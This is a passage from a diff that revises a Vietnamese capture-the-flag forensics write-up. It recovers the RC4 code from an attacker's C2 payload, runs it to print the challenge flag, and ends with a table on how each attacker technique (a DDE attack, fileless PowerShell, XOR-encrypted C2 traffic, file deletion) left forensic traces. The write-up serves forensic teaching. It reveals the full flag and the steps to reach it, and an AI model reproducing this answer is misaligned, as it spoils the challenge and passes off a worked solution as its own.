 print(RC4(key, plaintext).decode())
 ```
 
-**Payload 3 — Xác nhận xóa dấu vết:**
+**Payload 3** — Xác nhận xóa dấu vết sau khi thu thập xong:
+
 ```
 Delete file: C:\Users\BKISC\Desktop\flag.py - Success!
 ```
 
-### Bẫy thứ tư: File đã bị xóa khỏi đĩa
-
-Hacker đã chạy `flag.py` để lấy Flag rồi xóa ngay file đó. Dù mình cố khôi phục file từ đĩa (data carving) cũng không tìm thấy vì các sector đã bị ghi đè. Tuy nhiên, nhờ Specula gửi **nội dung file** về C2 server — và log đó được ghi lại vào Event Log — mình đã khôi phục được toàn bộ mã nguồn mà không cần file gốc.
+File `flag.py` đã bị xóa hoàn toàn khỏi đĩa. Tuy nhiên, Specula đã gửi nội dung của nó về C2 server — và toàn bộ traffic đó được Windows Event Log ghi lại trước khi xóa. Mình không cần file gốc vì đã có toàn bộ mã nguồn từ log.
 
 ---
 
 ## Bước 8 — Lấy Flag
 
-Mình chạy lại chính đoạn code Python của kẻ tấn công:
+Chạy lại đúng code trong payload vừa khôi phục:
 
 ```python
-def RC4(key : bytes, plaintext : bytes):
+def RC4(key, plaintext):
     S = list(range(256))
     j = 0
     for i in range(256):
         j = (j + S[i] + key[i % len(key)]) % 256
         S[i], S[j] = S[j], S[i]
     i = j = 0
-    ciphertext = []
+    result = []
     for char in plaintext:
         i = (i + 1) % 256
         j = (j + S[i]) % 256
         S[i], S[j] = S[j], S[i]
-        t = (S[i] + S[j]) % 256
-        k = S[t]
-        ciphertext.append(char ^ k)
-    return bytes(ciphertext)
+        result.append(char ^ S[(S[i] + S[j]) % 256])
+    return bytes(result)
 
 key = b"lookalikechicken"
 plaintext = b';fa\x98\xc9\x13\xc8\x89\xda\x04\xed\xb6\x19\x98\xfdgF-\x14S\xa8+\xf50\xc4p\xf90\xb2&j\x081'
 print(RC4(key, plaintext).decode())
 ```
-
-Kết quả:
 
 ```
 BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}
@@ -520,12 +410,14 @@ $$\boxed{\texttt{BKISC\{l0oK\_Ou7\_f0R\_0u71o0k\_C2!!!\}}}$$
 
 ## Nhận xét
 
-| Lớp bảo vệ của attacker | Cách vượt qua |
-|---|---|
-| Mã hóa mật khẩu file ZIP | Tìm bản Autosave không mã hóa trong AppData |
-| Không dùng Macro VBA | Nhận ra DDE Attack qua `externalLink1.bin` |
-| Dữ liệu trên đĩa bị nén Zlib | Quét và giải nén từng chunk theo magic byte |
-| Giao tiếp C2 mã hóa XOR | Agent ID lộ trong log → khóa giải mã |
-| Xóa `flag.py` sau khi chạy | Payload gốc đã bị ghi vào Event Log trước khi xóa |
+Điểm thú vị của bài này là ở chỗ mỗi lớp bảo vệ mà attacker dựng lên đều có một điểm yếu pháp y tương ứng — và tất cả những điểm yếu đó xuất phát từ chính các tính năng hợp lệ của hệ thống, không phải lỗi bảo mật theo nghĩa thông thường.
 
-Bài này thú vị ở chỗ không có bước nào là "công cụ thần kỳ giải quyết mọi thứ" — mỗi lớp bảo vệ đều phải phân tích lý do nó bị hỏng thay vì chỉ dùng brute force. Đặc biệt, việc nhận ra Specula và hiểu giao thức của nó là bước then chốt để giải mã được payload.
+| Lớp bảo vệ của attacker | Điểm yếu pháp y bị khai thác |
+|---|---|
+| Mã hóa mật khẩu ZIP | Excel Autosave không kế thừa mật khẩu |
+| Không dùng Macro VBA | DDE Attack để lại dấu vết trong `externalLink1.bin` |
+| Payload chạy trên RAM (Fileless) | PowerShell Script Block Logging ghi vào Event Log |
+| Traffic C2 mã hóa XOR | Agent ID lộ trong log plaintext — chính là khóa giải mã |
+| Xóa `flag.py` sau khi thu thập | Specula đã gửi nội dung file về C2 trước khi xóa |
+
+Bài học lớn nhất ở đây: **trong pháp y số, "xóa file" không đồng nghĩa với "xóa bằng chứng"**. Hệ điều hành và các ứng dụng luôn để lại dấu vết ở những nơi không ngờ tới — từ file `.lnk` trong `Recent`, đến Autosave của Office, đến Event Log, đến traffic đã được Windows cache lại. Nhiệm vụ của người điều tra là biết chính xác những nơi đó là đâu.
